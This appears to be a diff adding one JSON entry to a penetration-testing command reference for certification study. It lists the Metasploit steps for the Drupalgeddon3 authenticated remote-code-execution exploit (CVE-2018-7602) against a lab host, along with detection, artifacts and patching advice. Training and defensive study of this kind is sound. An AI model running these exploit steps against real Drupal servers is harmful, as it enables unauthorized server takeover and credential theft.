@@ -1,0 +1,97 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "metasploit"
+  ],
+  "tags": [
+    "drupal",
+    "cve",
+    "metasploit"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Drupal",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Set the authenticated session cookie",
+      "command": "set drupal_session SESS...=..."
+    },
+    {
+      "label": "Set the node id to attack",
+      "command": "set DRUPAL_NODE 1"
+    },
+    {
+      "label": "Set the Drupal vhost",
+      "command": "set VHOST drupal-acc.inlanefreight.local"
+    },
+    {
+      "label": "Run the exploit",
+      "command": "exploit"
+    }
+  ],
+  "notes": "CVE-2018-7602 is authenticated - you need a live session cookie and the target node id, so it's a post-login escalation, not an entry point.",
+  "references": [
+    {
+      "title": "Metasploit Framework",
+      "url": "https://www.metasploit.com/"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "drupalgeddon2",
+      "note": "Unauthenticated alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "drupal-detect",
+      "note": "Scopes the target version.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "drupalgeddon3-msf",
+  "name": "Drupalgeddon3 - Authenticated RCE (Metasploit)",
+  "command": "use exploit/multi/http/drupal_drupageddon3",
+  "description": "CVE-2018-7602 authenticated RCE. Requires a valid Drupal session cookie and a node id; set rhosts/vhost/drupal_session/drupal_node/lhost then exploit.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190"
+  ],
+  "exam": "msf-one-machine",
+  "defense": {
+    "why_it_works": "Drupalgeddon3 (CVE-2018-7602) is an authenticated RCE exploiting insufficient sanitization of the destination parameter in node deletion form actions. Any authenticated user with node deletion permission can trigger it.",
+    "prerequisites": "Any authenticated Drupal user session. Drupal 7.x < 7.59 or 8.x < 8.5.3.",
+    "impact": "Authenticated RCE as www-data. Meterpreter session enabling full server control and credential harvesting.",
+    "detection": "Authenticated request to node deletion endpoint with exploit payload in destination parameter. Metasploit User-Agent in HTTP headers. Outbound TCP from web server to attacker IP.",
+    "artifacts": "Web server access log (POST to node delete with malicious destination) | Meterpreter network session in SIEM | Drupal watchdog log (node delete action)",
+    "prevention": "Update to Drupal 7.59 / 8.5.3 or later. Restrict user permissions -- node deletion for admins only. WAF signatures for CVE-2018-7602.",
+    "misconfiguration": "Drupal running unpatched with authenticated users able to trigger the vulnerable node deletion handler.",
+    "vulnerable_config": "# Drupal 8.x < 8.5.3\n# destination parameter unsanitized in\n# core/modules/node/src/Form/DeleteMultiple.php",
+    "secure_config": "drush pm-update\n# Restrict node deletion role assignment\n# WAF: block exploit pattern in destination parameter",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "OWASP A06:2021"
+    ]
+  }
+}
